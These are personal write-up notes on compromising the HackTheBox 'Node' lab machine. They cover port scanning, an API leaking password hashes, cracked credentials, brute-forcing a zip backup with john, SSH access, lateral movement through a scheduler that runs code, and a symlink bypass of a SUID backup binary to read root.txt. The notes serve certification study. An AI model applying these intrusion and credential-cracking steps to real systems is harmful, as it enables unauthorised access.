# Enumeration

## Scan

* all ports (nmap -p- -Pn --max-retries 3 10.10.10.58 - finds 22/3000
* service on that gets

```
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Node$ nmap -O -sC -sV -Pn -p 22,3000 10.10.10.58 -o nmap_ports.txt
...
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Exploits

* for 22 - username enumeration maybe
* hadoop - probably not
  * [ ] check if stuck. 

```
Hadoop YARN ResourceManager - Command Execution (Metasploit) | exploits/linux/remote/45025.rb
```

## Enumerate webpage

* dirbuster on 3000. Some weird error? Try dirb and gobuster. Based on gobuster resp, seems to return 200 for everything? Maybe I can make a custom script? Curl and wget just show the same page for any url. 
* /login page doesn't seem to reveal username
* sqlmap on login request returns nothing helpful
* Well this is fuckin weird. I guess this is why enumeration is ranked high?

# Access

* This returns a different page, maybe I can just get a custom page that shows whenever something is new? 

  ```
  curl http://10.10.10.58:3000/partials/home.html
  ```

  * [x] Write script to check if the result is diff - curl <> | md5sum? 
    * Didn't actually help find anything new on api or partials or at root
    * test_directories.py just checks if the hash of the response is the same as the one that I want to avoid. 

* There are {{ variables }} returned? 

  * [x] Something? - probably not based on other found partials pages. 

* Looks like I can also get: http://10.10.10.58:3000/api/users and that returns this. Maybe I can crack a hash? 

  ```
  0	
  _id	"59a7365b98aa325cc03ee51c"
  username	"myP14ceAdm1nAcc0uNT"
  password	"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af"
  is_admin	true
  1	
  _id	"59a7368398aa325cc03ee51d"
  username	"tom"
  password	"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240"
  is_admin	false
  2	
  _id	"59a7368e98aa325cc03ee51e"
  username	"mark"
  password	"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73"
  is_admin	false
  3	
  _id	"59aa9781cced6f1d1490fce9"
  username	"rastating"
  password	"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0"
  is_admin	false
  ```

* Found that it's sha256 and that tom:spongebob and mark:snowflake and admin:manchester

* Login as admin and find the backup. 

* Download the backup after logging in as admin. Large text file. Seems like some kind of repeating, see the = at end and try to base 64 -d

  ```
  pat@kali:~/Desktop/Cert_Prep/htb/Linux/Node$ base64 -d myplace.backup > backup64
  pat@kali:~/Desktop/Cert_Prep/htb/Linux/Node$ file backup64 
  backup64: Zip archive data, at least v1.0 to extract
  ```

* says wrong password trying to decrypt. Tried all passwords and _ids. Gives me a file listing of the server though? Can't navigate to any of those files. 

* Brute?

  ```
  /sbin/zip2john backup64 > backup_hashes
  /sbin/john backup_hashes --wordlist=/usr/share/wordlists/rockyou.txt --format=PKZIP
  ```

* Got the password as magicword. Have the package-lock. Maybe I can search those for known vulns? 

* Downloaded dependency check and ran that. Nothing. 

* Oh, npm has a tool:

  ```
  pat@kali:~/Desktop/Cert_Prep/htb/Linux/Node/var/www/myplace$ npm audit --dry-run
  ```

* Returns a bunch of high severity vulns but they're all just DoS. 

* Look at code maybe? See that it's running a maybe vulnerable mongodb version if I was able to connect to it? Nothing for body-parser or express. 

* Mongodb is filtered so I can't reach it remotely, but the keys are there? Don't seem to be able to tell the app to send a specific command? Maybe I can use the key in the file to ssh in? 5AYRft73VtFpc84k

* Worked! 

# Escalation

## Getting Tom

* Need to get user.txt from tom. Currently mark. Can probably do that dB thing now. 

  ```
  searchsploit -x exploits/linux/remote/24947.txt
  ```

* Tried to make my own js code and upload and run it with node. Doesn't seem to work? Tried w/ users and test. Writeup time, although probably should use a privesc script before giving up but w/e. 

* Read writeup. Privesc script would have seen that tom was running that file and I would have seen it eventually. 

* Fine the scheduler app. See that it's execing. Make and run the add_doc.js script to create a shell. Have to ln -s the entire node-modules directory. 

  ```
  ln -s /var/www/myplace/node_modules .
  node add_doc.js
  ```

  

## Getting Root

* See the backup thing in the code and that it's a suid exec

* ltrace shows that it's checking against directories it doesn't like maybe? 

* Can use special characters and symbolix links to get the backup app to give me the stuff. Not sure why things that work in the cli break when in ltrace but seems to be happening. 

  ```
  mkdir -p /tmp/test/test1/test2
  ln -s /root/root.txt /tmp/test/test1/test2/a
  /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/test/test1/test2/a
  echo "theoutput" | base64 -d > backup_dir
  ```

* I still can't really explain what exactly I'm getting around with more slashes and why ltrace and it doesn't work. 

# Lessons

* Want to become another user? See if they're running any programs.
* Looking over binary or confused about it? ltrace or strace
* Good example of how to get around characters that aren't allowed: https://alamot.github.io/node_writeup/#1-using-symbolic-links
  * Apparently it's even possible to do command injection on the app